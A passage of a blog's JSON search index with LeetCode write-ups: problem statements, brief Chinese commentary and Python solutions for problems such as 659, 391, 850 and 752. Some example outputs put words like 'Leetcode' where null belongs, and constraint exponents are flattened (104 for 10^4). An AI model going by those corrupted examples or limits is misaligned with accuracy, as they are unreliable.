\"())\"Output: 0Explanation: The string is already balanced.Example 3:\nInput: s = \"))())(\"Output: 3Explanation: Add '(' to match the first '))', Add '))' to match the last '('.Example 4:\nInput: s = \"((((((\"Output: 12Explanation: Add 12 ')' to balance the string.Example 5:\nInput: s = \")))))))\"Output: 5Explanation: Add 4 '(' at the beginning of the string and one ')' at the end. The string becomes \"(((())))))))\". Constraints:\n1 \u003c= s.length \u003c= 10^5s consists of '(' and ')' only. Sol 先把string的))換成一個新字元，剩下就是case by case\nclass Solution: def minInsertions(self, s: str) -\u0026gt; int: s = s.replace(\u0026#34;))\u0026#34;, \u0026#34;x\u0026#34;) left , right, half = 0,0,0 ret = 0 for c in s: if c == \u0026#34;(\u0026#34;: left += 1 elif c == \u0026#34;x\u0026#34;: if left \u0026gt; 0: left -= 1 else: ret += 1 else: if left \u0026gt; 0: left -= 1 ret += 1 else: ret += 2 return ret+left*2+right+half*2 ","permalink":"https://littlebees.github.io/2021/09/leetcode-1541-minimum-insertions-to-balance-a-parentheses-string/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e先把礙事的處理掉就好!!\u003c/p\u003e","title":"leetcode-1541 - Minimum Insertions to Balance a Parentheses String"},{"content":"動機 跟patch array一樣很有魔法的題目\nProblem You are given an integer array nums that is sorted in non-decreasing order.\nDetermine if it is possible to split nums into one or more subsequences such that both of the following conditions are true:\nEach subsequence is a consecutive increasing sequence (i.e. each integer is exactly one more than the previous integer).All subsequences have a length of 3 or more.Return true if you can split nums according to the above conditions, or false otherwise.\nA subsequence of an array is a new array that is formed from the original array by deleting some (can be none) of the elements without disturbing the relative positions of the remaining elements. (i.e., [1,3,5] is a subsequence of [1,2,3,4,5] while [1,3,2] is not).\nExample 1:\nInput: nums = [1,2,3,3,4,5]Output: trueExplanation: nums can be split into the following subsequences:[1,2,3,3,4,5] --\u003e 1, 2, 3[1,2,3,3,4,5] --\u003e 3, 4, 5Example 2:\nInput: nums = [1,2,3,3,4,4,5,5]Output: trueExplanation: nums can be split into the following subsequences:[1,2,3,3,4,4,5,5] --\u003e 1, 2, 3, 4, 5[1,2,3,3,4,4,5,5] --\u003e 3, 4, 5Example 3:\nInput: nums = [1,2,3,4,4,5]Output: falseExplanation: It is impossible to split nums into consecutive increasing subsequences of length 3 or more. Constraints:\n1 \u003c= nums.length \u003c= 104-1000 \u003c= nums[i] \u003c= 1000nums is sorted in non-decreasing order. Sol 追蹤以此點為結尾的list長度，那list有兩種產生方式\n加到尾巴: ... n-1 + n 當成新的list: n + n+1 + n+2 class Solution: def isPossible(self, nums: List[int]) -\u0026gt; bool: left = Counter(nums) end = defaultdict(int) for n in nums: if left[n]: left[n] -= 1 if end[n-1]: end[n-1] -= 1 end[n] += 1 elif left[n+1] and left[n+2]: left[n+2] -= 1 left[n+1] -= 1 end[n+2] += 1 else: return False return True ","permalink":"https://littlebees.github.io/2021/09/leetcode-659-split-array-into-consecutive-subsequences/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e跟patch array一樣很有魔法的題目\u003c/p\u003e","title":"leetcode-659 - Split Array into Consecutive Subsequences"},{"content":"動機 原來有symmetric difference\nProblem Given an array rectangles where rectangles[i] = [xi, yi, ai, bi] represents an axis-aligned rectangle. The bottom-left point of the rectangle is (xi, yi) and the top-right point of it is (ai, bi).\nReturn true if all the rectangles together form an exact cover of a rectangular region.\nExample 1:\nInput: rectangles = [[1,1,3,3],[3,1,4,2],[3,2,4,4],[1,3,2,4],[2,3,3,4]]Output: trueExplanation: All 5 rectangles together form an exact cover of a rectangular region.Example 2:\nInput: rectangles = [[1,1,2,3],[1,3,2,4],[3,1,4,2],[3,2,4,4]]Output: falseExplanation: Because there is a gap between the two rectangular regions.Example 3:\nInput: rectangles = [[1,1,3,3],[3,1,4,2],[1,3,2,4],[3,2,4,4]]Output: falseExplanation: Because there is a gap in the top center.Example 4:\nInput: rectangles = [[1,1,3,3],[3,1,4,2],[1,3,2,4],[2,2,4,4]]Output: falseExplanation: Because two of the rectangles overlap with each other. Constraints:\n1 \u003c= rectangles.length \u003c= 2 * 104rectangles[i].length == 4-105 \u003c= xi, yi, ai, bi \u003c= 105 Sol symmetric difference: 把同樣的去掉不同的加進來\n這樣處理overlay就很簡單，最後看點是不是最大的4個點就好\nclass Solution: def isRectangleCover(self, rects: List[List[int]]) -\u0026gt; bool: points = set() xl,yl, xh,yh = float(\u0026#39;inf\u0026#39;), float(\u0026#39;inf\u0026#39;), float(\u0026#39;-inf\u0026#39;), float(\u0026#39;-inf\u0026#39;) area = 0 for x1,y1,x2,y2 in rects: xl, yl = min(xl, x1), min(yl, y1) xh, yh = max(xh, x2), max(yh, y2) area += (y2-y1)*(x2-x1) points ^= {(x1,y1), (x1,y2), (x2,y1), (x2,y2)} #print(points, area, (xl,xh), (yl,yh)) return points == {(xl,yl), (xl, yh), (xh, yl), (xh, yh)} and area == (xh-xl)*(yh-yl) ","permalink":"https://littlebees.github.io/2021/09/leetcode-391-perfect-rectangle/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e原來有symmetric difference\u003c/p\u003e","title":"leetcode-391 - Perfect Rectangle"},{"content":"動機 在你疑惑怎麼在x軸做linesweep時，lee215直接從y軸做離散化!!\nProblem We are given a list of (axis-aligned) rectangles. Each rectangle[i] = [xi1, yi1, xi2, yi2] , where (xi1, yi1) are the coordinates of the bottom-left corner, and (xi2, yi2) are the coordinates of the top-right corner of the ith rectangle.\nFind the total area covered by all rectangles in the plane. Since the answer may be too large, return it modulo 109 + 7.\nExample 1:\nInput: rectangles = [[0,0,2,2],[1,0,2,3],[1,0,3,1]]Output: 6Explanation: As illustrated in the picture.Example 2:\nInput: rectangles = [[0,0,1000000000,1000000000]]Output: 49Explanation: The answer is 1018 modulo (109 + 7), which is (109)2 = (-7)2 = 49. Constraints:\n1 \u003c= rectangles.length \u003c= 200rectanges[i].length = 40 \u003c= rectangles[i][j] \u003c= 109The total area covered by all rectangles will never exceed 263 - 1 and thus will fit in a 64-bit signed integer. Sol 紀錄y軸被覆蓋的區域，加總\nclass Solution: def rectangleArea(self, rectangles: List[List[int]]) -\u0026gt; int: xs = sorted(set([x for x1,y1,x2,y2 in rectangles for x in [x1,x2]])) x2i = {x:i for i,x in enumerate(xs)} ystate = [0]*len(x2i) timeline = sorted([[y,x1,x2,seg] for x1,y1,x2,y2 in rectangles for y,seg in [[y1,1],[y2,-1]]]) cur_y = xsum = area = 0 for y,x1,x2,seg in timeline: area += (y-cur_y) * xsum cur_y = y for i in range(x2i[x1],x2i[x2]): ystate[i] += seg xsum = sum(x2-x1 if c else 0 for x1,x2,c in zip(xs,xs[1:],ystate)) return area % (10**9 + 7) ","permalink":"https://littlebees.github.io/2021/09/leetcode-850-rectangle-area-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e在你疑惑怎麼在x軸做linesweep時，lee215直接從y軸做離散化!!\u003c/p\u003e","title":"leetcode-850 - Rectangle Area II"},{"content":"動機 也是有魔法的一題\n階乘中5的數量怎麼找? Problem Let f(x) be the number of zeroes at the end of x!. Recall that x! = 1 * 2 * 3 * ... * x and by convention, 0! = 1.\nFor example, f(3) = 0 because 3! = 6 has no zeroes at the end, while f(11) = 2 because 11! = 39916800 has two zeroes at the end.Given an integer k, return the number of non-negative integers x have the property that f(x) = k.\nExample 1:\nInput: k = 0Output: 5Explanation: 0!, 1!, 2!, 3!, and 4! end with k = 0 zeroes.Example 2:\nInput: k = 5Output: 0Explanation: There is no x such that x! ends in k = 5 zeroes.Example 3:\nInput: k = 3Output: 5 Constraints:\n0 \u003c= k \u003c= 109 Sol 在階乘中5的數量一定比2少，所以找有幾個5就好 但要怎麼找?\ndef fives(n): # magic ret = 0 while n \u0026gt; 0: ret += n//5 n = n//5 return ret 接著就是找有幾個 k-1 (k) .... k (k+1) k+1 ... 所以我們找lowerbound\nclass Solution: def preimageSizeFZF(self, k: int) -\u0026gt; int: def fives(n): # magic ret = 0 while n \u0026gt; 0: ret += n//5 n = n//5 return ret def lowerbound(k): a, b = 0, 5*(k+1) while a\u0026lt;b: mid = (a+b)//2 if k \u0026gt; fives(mid): a = mid+1 else: b = mid return a # k-1 (k) .... k (k+1) k+1 ... return lowerbound(k+1)-lowerbound(k) ","permalink":"https://littlebees.github.io/2021/09/leetcode-793-preimage-size-of-factorial-zeroes-function/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e也是有魔法的一題\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e階乘中5的數量怎麼找?\u003c/li\u003e\n\u003c/ul\u003e","title":"leetcode-793 - Preimage Size of Factorial Zeroes Function"},{"content":"動機 有點魔法的一題\nProblem Given a sorted integer array nums and an integer n, add/patch elements to the array such that any number in the range [1, n] inclusive can be formed by the sum of some elements in the array.\nReturn the minimum number of patches required.\nExample 1:\nInput: nums = [1,3], n = 6Output: 1Explanation:Combinations of nums are [1], [3], [1,3], which form possible sums of: 1, 3, 4.Now if we add/patch 2 to nums, the combinations are: [1], [2], [3], [1,3], [2,3], [1,2,3].Possible sums are 1, 2, 3, 4, 5, 6, which now covers the range [1, 6].So we only need 1 patch.Example 2:\nInput: nums = [1,5,10], n = 20Output: 2Explanation: The two patches can be [2, 4].Example 3:\nInput: nums = [1,2,2], n = 5Output: 0 Constraints:\n1 \u003c= nums.length \u003c= 10001 \u003c= nums[i] \u003c= 104nums is sorted in ascending order.1 \u003c= n \u003c= 231 - 1 Sol 假設現在可以組合出的數字是1~miss，所以有兩個case 如果目前的數字在可以組合出的範圍中，就直接加上去 如果不在，就是加最大的數字，miss\nclass Solution: def minPatches(self, nums: List[int], n: int) -\u0026gt; int: miss = 1 i = 0 ret = 0 while miss \u0026lt;= n: if i \u0026lt; len(nums) and nums[i] \u0026lt;= miss: miss += nums[i] i += 1 else: miss += miss ret += 1 return ret ","permalink":"https://littlebees.github.io/2021/09/leetcode-330-patching-array/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e有點魔法的一題\u003c/p\u003e","title":"leetcode-330 - Patching Array"},{"content":"動機 如果沒有大於3的限制就很簡單 同時，又是一題只能用bottom-up的dp\nProblem Given an integer array nums, return the number of all the arithmetic subsequences of nums.\nA sequence of numbers is called arithmetic if it consists of at least three elements and if the difference between any two consecutive elements is the same.\nFor example, [1, 3, 5, 7, 9], [7, 7, 7, 7], and [3, -1, -5, -9] are arithmetic sequences.For example, [1, 1, 2, 5, 7] is not an arithmetic sequence.A subsequence of an array is a sequence that can be formed by removing some elements (possibly none) of the array.\nFor example, [2,5,10] is a subsequence of [1,2,1,2,4,1,5,10].The test cases are generated so that the answer fits in 32-bit integer.\nExample 1:\nInput: nums = [2,4,6,8,10]Output: 7Explanation: All arithmetic subsequence slices are:[2,4,6][4,6,8][6,8,10][2,4,6,8][4,6,8,10][2,4,6,8,10][2,6,10]Example 2:\nInput: nums = [7,7,7,7,7]Output: 16Explanation: Any subsequence of this array is arithmetic. Constraints:\n1 \u003c= nums.length \u003c= 1000-231 \u003c= nums[i] \u003c= 231 - 1 Sol 這裡的重點是長度大於3 所以利用從buttom-up時，前一個會被建構好這件事，去取答案\nclass Solution: def numberOfArithmeticSlices(self, nums: List[int]) -\u0026gt; int: dp = defaultdict(lambda : defaultdict(int)) ret = 0 for i in range(len(nums)): for j in range(i): diff = nums[i]-nums[j] ret += dp[j][diff] # Use all comb whose size is bigger than 1 to construct this case!! dp[i][diff] += dp[j][diff]+1 return ret ","permalink":"https://littlebees.github.io/2021/09/leetcode-446-arithmetic-slices-ii-subsequence/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e如果沒有大於3的限制就很簡單\n同時，又是一題只能用bottom-up的dp\u003c/p\u003e","title":"leetcode-446 - Arithmetic Slices II - Subsequence"},{"content":"動機 太久沒打真的會忘記 這是prefix sum阿\nProblem There are n flights that are labeled from 1 to n.\nYou are given an array of flight bookings bookings, where bookings[i] = [firsti, lasti, seatsi] represents a booking for flights firsti through lasti (inclusive) with seatsi seats reserved for each flight in the range.\nReturn an array answer of length n, where answer[i] is the total number of seats reserved for flight i.\nExample 1:\nInput: bookings = [[1,2,10],[2,3,20],[2,5,25]], n = 5Output: [10,55,45,25,25]Explanation:Flight labels: 1 2 3 4 5Booking 1 reserved: 10 10Booking 2 reserved: 20 20Booking 3 reserved: 25 25 25 25Total seats: 10 55 45 25 25Hence, answer = [10,55,45,25,25]Example 2:\nInput: bookings = [[1,2,10],[2,2,15]], n = 2Output: [10,25]Explanation:Flight labels: 1 2Booking 1 reserved: 10 10Booking 2 reserved: 15Total seats: 10 25Hence, answer = [10,25] Constraints:\n1 \u003c= n \u003c= 2 * 1041 \u003c= bookings.length \u003c= 2 * 104bookings[i].length == 31 \u003c= firsti \u003c= lasti \u003c= n1 \u003c= seatsi \u003c= 104 Sol class Solution: def corpFlightBookings(self, bookings: List[List[int]], n: int) -\u0026gt; List[int]: res = [0] * (n+1) for first, last, num in bookings: res[first-1] += num res[last] -= num for i in range(1, len(res)): res[i] += res[i-1] return res[:-1] ","permalink":"https://littlebees.github.io/2021/09/leetcode-1109-corporate-flight-bookings/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e太久沒打真的會忘記\n這是prefix sum阿\u003c/p\u003e","title":"leetcode-1109 - Corporate Flight Bookings"},{"content":"動機 又是每次bsearch需要特別函數的類型\nProblem Koko loves to eat bananas. There are n piles of bananas, the ith pile has piles[i] bananas. The guards have gone and will come back in h hours.\nKoko can decide her bananas-per-hour eating speed of k. Each hour, she chooses some pile of bananas and eats k bananas from that pile. If the pile has less than k bananas, she eats all of them instead and will not eat any more bananas during this hour.\nKoko likes to eat slowly but still wants to finish eating all the bananas before the guards return.\nReturn the minimum integer k such that she can eat all the bananas within h hours.\nExample 1:\nInput: piles = [3,6,7,11], h = 8Output: 4Example 2:\nInput: piles = [30,11,23,4,20], h = 5Output: 30Example 3:\nInput: piles = [30,11,23,4,20], h = 6Output: 23 Constraints:\n1 \u003c= piles.length \u003c= 104piles.length \u003c= h \u003c= 1091 \u003c= piles[i] \u003c= 109 Sol class Solution: def minEatingSpeed(self, piles: List[int], h: int) -\u0026gt; int: def eat(k): return sum([math.ceil(x/k) for x in piles]) a,b = 1, sum(piles) while a\u0026lt;b: mid = (a+b)//2 if eat(mid) \u0026lt;= h: b = mid else: a = mid+1 return a ","permalink":"https://littlebees.github.io/2021/09/leetcode-875-koko-eating-bananas/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e又是每次bsearch需要特別函數的類型\u003c/p\u003e","title":"leetcode-875 - Koko Eating Bananas"},{"content":"動機 random題都很奇妙\nProblem You are given an integer n and an array of unique integers blacklist. Design an algorithm to pick a random integer in the range [0, n - 1] that is not in blacklist. Any integer that is in the mentioned range and not in blacklist should be equally likely returned.\nOptimize your algorithm such that it minimizes the call to the built-in random function of your language.\nImplement the Solution class:\nSolution(int n, int[] blacklist) Initializes the object with the integer n and the blacklisted integers blacklist.int pick() Returns a random integer in the range [0, n - 1] and not in blacklist. All the possible integers should be equally likely returned. Example 1:\nInput[\"Solution\", \"pick\", \"pick\", \"pick\", \"pick\", \"pick\", \"pick\", \"pick\"][[7, [2, 3, 5]], [], [], [], [], [], [], []]Output[Algorithm, Leetcode, 6, 4, 1, 6, 1, 6, 4]ExplanationSolution solution = new Solution(7, [2, 3, 5]);solution.pick(); // return 6, any integer from [1,4,6] should be ok. Note that for every call of pick, 1, 4, and 6 must be equally likely to be returned (i.e., with probability 1/3).solution.pick(); // return 4solution.pick(); // return 1solution.pick(); // return 6solution.pick(); // return 1solution.pick(); // return 6solution.pick(); // return 4 Constraints:\n1 \u003c= n \u003c= 1090 \u003c= blacklist.length \u003c- min(105, n - 1)0 \u003c= blacklist[i] \u003c nAll the values of blacklist are unique.At most 2 * 104 calls will be made to pick. Sol 把range減blacklist，再把在這個範圍的blacklist對應到範圍外的數字\nclass Solution: def __init__(self, n: int, bl: List[int]): n2n = {} bl = set(bl) m = n-len(bl) replace = n-1 for b in bl: if b \u0026lt; m: while replace \u0026gt; m and replace in bl: replace -= 1 n2n[b] = replace replace -= 1 self.n2n = n2n self.m = m def pick(self) -\u0026gt; int: i = randrange(self.m) if i in self.n2n: return self.n2n[i] else: return i ","permalink":"https://littlebees.github.io/2021/09/leetcode-710-random-pick-with-blacklist/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003erandom題都很奇妙\u003c/p\u003e","title":"leetcode-710 - Random Pick with Blacklist"},{"content":"動機 經典的binary search題\n注意結果是不是連續的!! Problem Given an array nums which consists of non-negative integers and an integer m, you can split the array into m non-empty continuous subarrays.\nWrite an algorithm to minimize the largest sum among these m subarrays.\nExample 1:\nInput: nums = [7,2,5,10,8], m = 2Output: 18Explanation:There are four ways to split nums into two subarrays.The best way is to split it into [7,2,5] and [10,8],where the largest sum among the two subarrays is only 18.Example 2:\nInput: nums = [1,2,3,4,5], m = 2Output: 9Example 3:\nInput: nums = [1,4,4], m = 3Output: 4 Constraints:\n1 \u003c= nums.length \u003c= 10000 \u003c= nums[i] \u003c= 1061 \u003c= m \u003c= min(50, nums.length) Sol 去割算總數，bsearch 同時留一個位置存最大的數\nclass Solution: def splitArray(self, nums: List[int], m: int) -\u0026gt; int: def split(limit): cnt = nums[0] ret = 0 big = 0 for n in nums[1:]: if n \u0026gt; limit: return float(\u0026#39;inf\u0026#39;), None if cnt+n \u0026gt; limit: big = max(big,cnt) cnt = n ret += 1 else: cnt += n big = max(big,cnt) return ret+1, big if len(nums) == m: return max(nums) a,b = 0, sum(nums)+1 big = 0 while a\u0026lt;b: mid = (a+b)//2 gps,n = split(mid) #print(a,mid,b,gps,n) if gps \u0026lt;= m: big = n b = mid else: a = mid+1 return big ","permalink":"https://littlebees.github.io/2021/09/leetcode-410-split-array-largest-sum/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e經典的binary search題\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e注意結果是不是連續的!!\u003c/li\u003e\n\u003c/ul\u003e","title":"leetcode-410 - Split Array Largest Sum"},{"content":"動機 用rebuild的思維\nProblem You are given the root node of a binary search tree (BST) and a value to insert into the tree. Return the root node of the BST after the insertion. It is guaranteed that the new value does not exist in the original BST.\nNotice that there may exist multiple valid ways for the insertion, as long as the tree remains a BST after insertion. You can return any of them.\nExample 1:\nInput: root = [4,2,7,1,3], val = 5Output: [4,2,7,1,3,5]Explanation: Another accepted tree is:Example 2:\nInput: root = [40,20,60,10,30,50,70], val = 25Output: [40,20,60,10,30,50,70,Leetcode,null,25]Example 3:\nInput: root = [4,2,7,1,3,null,null,null,null,null,null], val = 5Output: [4,2,7,1,3,5] Constraints:\nThe number of nodes in the tree will be in the range [0, 104].-108 \u003c= Node.val \u003c= 108All the values Node.val are unique.-108 \u003c= val \u003c= 108It's guaranteed that val does not exist in the original BST. Sol class Solution: def insertIntoBST(self, root: Optional[TreeNode], val: int) -\u0026gt; Optional[TreeNode]: if not root: return TreeNode(val) elif root.val \u0026lt; val: root.right = self.insertIntoBST(root.right, val) return root else: root.left = self.insertIntoBST(root.left, val) return root ","permalink":"https://littlebees.github.io/2021/09/leetcode-701-insert-into-a-binary-search-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e用rebuild的思維\u003c/p\u003e","title":"leetcode-701 - Insert into a Binary Search Tree"},{"content":"動機 就是BFS\nProblem You have a lock in front of you with 4 circular wheels. Each wheel has 10 slots: '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'. The wheels can rotate freely and wrap around: for example we can turn '9' to be '0', or '0' to be '9'. Each move consists of turning one wheel one slot.\nThe lock initially starts at '0000', a string representing the state of the 4 wheels.\nYou are given a list of deadends dead ends, meaning if the lock displays any of these codes, the wheels of the lock will stop turning and you will be unable to open it.\nGiven a target representing the value of the wheels that will unlock the lock, return the minimum total number of turns required to open the lock, or -1 if it is impossible.\nExample 1:\nInput: deadends = [\"0201\",\"0101\",\"0102\",\"1212\",\"2002\"], target = \"0202\"Output: 6Explanation:A sequence of valid moves would be \"0000\" -\u003e \"1000\" -\u003e \"1100\" -\u003e \"1200\" -\u003e \"1201\" -\u003e \"1202\" -\u003e \"0202\".Note that a sequence like \"0000\" -\u003e \"0001\" -\u003e \"0002\" -\u003e \"0102\" -\u003e \"0202\" would be invalid,because the wheels of the lock become stuck after the display becomes the dead end \"0102\".Example 2:\nInput: deadends = [\"8888\"], target = \"0009\"Output: 1Explanation:We can turn the last wheel in reverse to move from \"0000\" -\u003e \"0009\".Example 3:\nInput: deadends = [\"8887\",\"8889\",\"8878\",\"8898\",\"8788\",\"8988\",\"7888\",\"9888\"], target = \"8888\"Output: -1Explanation:We can't reach the target without getting stuck.Example 4:\nInput: deadends = [\"0000\"], target = \"8888\"Output: -1 Constraints:\n1 \u003c= deadends.length \u003c= 500deadends[i].length == 4target.length == 4target will not be in the list deadends.target and deadends[i] consist of digits only. Sol class Solution: def openLock(self, deadends: List[str], target: str) -\u0026gt; int: inc = lambda s,i: f\u0026#39;{s[:i]}{(int(s[i])+1) % 10}{s[i+1:]}\u0026#39; dec = lambda s,i: f\u0026#39;{s[:i]}{int(s[i])-1 if int(s[i]) \u0026gt; 0 else 9}{s[i+1:]}\u0026#39; deadends = set(deadends) if \u0026#34;0000\u0026#34; not in deadends: q = deque([[\u0026#34;0000\u0026#34;, 0]]) seen = set() while q: slots, steps = q.popleft() if slots == target: return steps elif slots not in seen: seen.add(slots) nexts = [] for i in range(4): nexts.append(inc(slots, i)) nexts.append(dec(slots, i)) nexts = [[x, steps+1] for x in nexts if x not in deadends] q.extend(nexts) return -1 ","permalink":"https://littlebees.github.io/2021/09/leetcode-752-open-the-lock/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就是BFS\u003c/p\u003e","title":"leetcode-752 - Open the Lock"},{"content":"動機 這種找規律的真的好難，就像魔法一樣\nProblem You are given a string s and an integer k. You can choose one of the first k letters of s and append it at the end of the string..\nReturn the lexicographically smallest string you could have after applying the mentioned step any number of moves.\nExample 1:\nInput: s = \"cba\", k = 1Output: \"acb\"Explanation: In the first move, we move the 1st character 'c' to the end, obtaining the string \"bac\".In the second move, we move the 1st character 'b' to the end, obtaining the final result \"acb\".Example 2:\nInput: s = \"baaca\", k = 3Output: \"aaabc\"Explanation: In the first move, we move the 1st character 'b' to the end, obtaining the string \"aacab\".In the second move, we move the 3rd character 'c' to the end, obtaining the final result \"aaabc\". Constraints:\n1 \u003c= k \u003c= s.length \u003c= 1000s consist of lowercase English letters. Sol s只有1就是rotate，那就是一直試\ns有1以上就變成bubble sort的冒泡泡了\nclass Solution: def orderlyQueue(self, s: str, k: int) -\u0026gt; str: if k == 1: ret = s tmp = s for _ in range(len(s)): tmp = tmp[1:]+tmp[0] if tmp \u0026lt; ret: ret = tmp return ret else: return \u0026#39;\u0026#39;.join(sorted(s)) ","permalink":"https://littlebees.github.io/2021/09/leetcode-899-orderly-queue/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這種找規律的真的好難，就像魔法一樣\u003c/p\u003e","title":"leetcode-899 - Orderly Queue"},{"content":"動機 post order很重要!!\nProblem Given a binary tree root, return the maximum sum of all keys of any sub-tree which is also a Binary Search Tree (BST).\nAssume a BST is defined as follows:\nThe left subtree of a node contains only nodes with keys less than the node's key.The right subtree of a node contains only nodes with keys greater than the node's key.Both the left and right subtrees must also be binary search trees. Example 1:\nInput: root = [1,4,3,2,4,2,5,Leetcode,null,null,null,null,null,4,6]Output: 20Explanation: Maximum sum in a valid Binary search tree is obtained in root node with key equal to 3.Example 2:\nInput: root = [4,3,null,1,2]Output: 2Explanation: Maximum sum in a valid Binary search tree is obtained in a single root node with key equal to 2.Example 3:\nInput: root = [-4,-2,-5]Output: 0Explanation: All values are negatives. Return an empty BST.Example 4:\nInput: root = [2,1,3]Output: 6Example 5:\nInput: root = [5,4,8,3,null,6,3]Output: 7 Constraints:\nThe number of nodes in the tree is in the range [1, 4 * 104].-4 * 104 \u003c= Node.val \u003c= 4 * 104 Sol 這裡要處理\n加總 驗證BST 如果從上到下，會很痛苦；所以要想起從底部往上也是tree，可以一步一步往上加與驗證\nclass Solution: def maxSumBST(self, root: TreeNode) -\u0026gt; int: ret = 0 def post(root): nonlocal ret if not root: return [float(\u0026#39;inf\u0026#39;), float(\u0026#39;-inf\u0026#39;), 0] else: lmin, lmax, lsum = post(root.left) rmin, rmax, rsum = post(root.right) if lsum is not None and rsum is not None and lmax \u0026lt; root.val \u0026lt; rmin: ret = max(ret, root.val+lsum+rsum) return [min(lmin,root.val), max(root.val, rmax), root.val+lsum+rsum] else: return [0,0,None] post(root) return ret ","permalink":"https://littlebees.github.io/2021/09/leetcode-1373-maximum-sum-bst-in-binary-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003epost order很重要!!\u003c/p\u003e","title":"leetcode-1373 - Maximum Sum BST in Binary Tree"},{"content":"動機 水一波\nProblem A newly designed keypad was tested, where a tester pressed a sequence of n keys, one at a time.\nYou are given a string keysPressed of length n, where keysPressed[i] was the ith key pressed in the testing sequence, and a sorted list releaseTimes, where releaseTimes[i] was the time the ith key was released. Both arrays are 0-indexed. The 0th key was pressed at the time 0, and every subsequent key was pressed at the exact time the previous key was released.\nThe tester wants to know the key of the keypress that had the longest duration. The ith keypress had a duration of releaseTimes[i] - releaseTimes[i - 1], and the 0th keypress had a duration of releaseTimes[0].\nNote that the same key could have been pressed multiple times during the test, and these multiple presses of the same key may not have had the same duration.\nReturn the key of the keypress that had the longest duration. If there are multiple such keypresses, return the lexicographically largest key of the keypresses.\nExample 1:\nInput: releaseTimes = [9,29,49,50], keysPressed = \"cbcd\"Output: \"c\"Explanation: The keypresses were as follows:Keypress for 'c' had a duration of 9 (pressed at time 0 and released at time 9).Keypress for 'b' had a duration of 29 - 9 = 20 (pressed at time 9 right after the release of the previous character and released at time 29).Keypress for 'c' had a duration of 49 - 29 = 20 (pressed at time 29 right after the release of the previous character and released at time 49).Keypress for 'd' had a duration of 50 - 49 = 1 (pressed at time 49 right after the release of the previous character and released at time 50).The longest of these was the keypress for 'b' and the second keypress for 'c', both with duration 20.'c' is lexicographically larger than 'b', so the answer is 'c'.Example 2:\nInput: releaseTimes = [12,23,36,46,62], keysPressed = \"spuda\"Output: \"a\"Explanation: The keypresses were as follows:Keypress for 's' had a duration of 12.Keypress for 'p' had a duration of 23 - 12 = 11.Keypress for 'u' had a duration of 36 - 23 = 13.Keypress for 'd' had a duration of 46 - 36 = 10.Keypress for 'a' had a duration of 62 - 46 = 16.The longest of these was the keypress for 'a' with duration 16. Constraints:\nreleaseTimes.length == nkeysPressed.length == n2 \u003c= n \u003c= 10001 \u003c= releaseTimes[i] \u003c= 109releaseTimes[i] \u003c releaseTimes[i+1]keysPressed contains only lowercase English letters. Sol class Solution: def slowestKey(self, rs: List[int], keysPressed: str) -\u0026gt; str: tmp = [a-b for a,b in zip(rs, [0]+rs[:-1])] cs = defaultdict(set) for i, c in zip(tmp, keysPressed): cs[i].add(c) return max(cs[max(cs.keys())]) ","permalink":"https://littlebees.github.io/2021/09/leetcode-1629-slowest-key/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e水一波\u003c/p\u003e","title":"leetcode-1629 - Slowest Key"},{"content":"動機 順著走就好\nProblem Given the root of a Binary Search Tree (BST), convert it to a Greater Tree such that every key of the original BST is changed to the original key plus sum of all keys greater than the original key in BST.\nAs a reminder, a binary search tree is a tree that satisfies these constraints:\nThe left subtree of a node contains only nodes with keys less than the node's key.The right subtree of a node contains only nodes with keys greater than the node's key.Both the left and right subtrees must also be binary search trees.Note: This question is the same as 538: https://leetcode.com/problems/convert-bst-to-greater-tree/\nExample 1:\nInput: root = [4,1,6,0,2,5,7,Leetcode,null,null,3,null,null,null,8]Output: [30,36,21,36,35,26,15,null,null,null,33,null,null,null,8]Example 2:\nInput: root = [0,null,1]Output: [1,null,1]Example 3:\nInput: root = [1,0,2]Output: [3,3,2]Example 4:\nInput: root = [3,2,4,1]Output: [7,9,4,10] Constraints:\nThe number of nodes in the tree is in the range [1, 100].0 \u003c= Node.val \u003c= 100All the values in the tree are unique.root is guaranteed to be a valid binary search tree. Sol class Solution: def bstToGst(self, root: TreeNode) -\u0026gt; TreeNode: def post(root, cnt=0): if not root: return cnt else: right = post(root.right, cnt) root.val += right return post(root.left, root.val) post(root) return root ","permalink":"https://littlebees.github.io/2021/09/leetcode-1038-binary-search-tree-to-greater-sum-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e順著走就好\u003c/p\u003e","title":"leetcode-1038 - Binary Search Tree to Greater Sum Tree"},{"content":"動機 Problem Given a string text, you want to use the characters of text to form as many instances of the word \"balloon\" as possible.\nYou can use each character in text at most once. Return the maximum number of instances that can be formed.\nExample 1:\nInput: text = \"nlaebolko\"Output: 1Example 2:\nInput: text = \"loonbalxballpoon\"Output: 2Example 3:\nInput: text = \"leetcode\"Output: 0 Constraints:\n1 \u003c= text.length \u003c= 104text consists of lower case English letters only. Sol class Solution: def maxNumberOfBalloons(self, text: str) -\u0026gt; int: pat = Counter(\u0026#34;balloon\u0026#34;) text = Counter(text) tmp = {k: text[k]//v for k,v in 